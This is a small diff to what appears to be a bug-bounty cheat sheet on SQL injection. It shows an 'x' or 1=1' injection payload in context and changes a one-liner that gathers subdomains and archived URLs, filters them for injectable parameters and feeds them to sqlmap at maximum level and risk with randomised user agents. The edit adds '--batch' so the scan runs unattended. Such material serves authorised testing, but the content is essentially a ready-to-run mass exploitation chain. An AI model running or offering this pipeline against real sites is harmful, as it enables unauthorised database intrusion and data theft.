@@ -48,5 +48,5 @@ x' or 1=1 or 'x'='y
 </samp>
 
 ```
-cat wilcard.txt | subfinder -silent | httpx -silent | waybackurls | tee -a potential.txt; gf sqli | anew sqlmap.txt; sqlmap -m sqlmap.txt --technique=BEUST --level=5 --risk=3 -v3 --random-agent --dbs
+cat wilcard.txt | subfinder -silent | httpx -silent | waybackurls | tee -a potential.txt; gf sqli | anew sqlmap.txt; sqlmap -m sqlmap.txt --technique=BEUST --level=5 --risk=3 -v3 --random-agent --dbs --batch
 ```
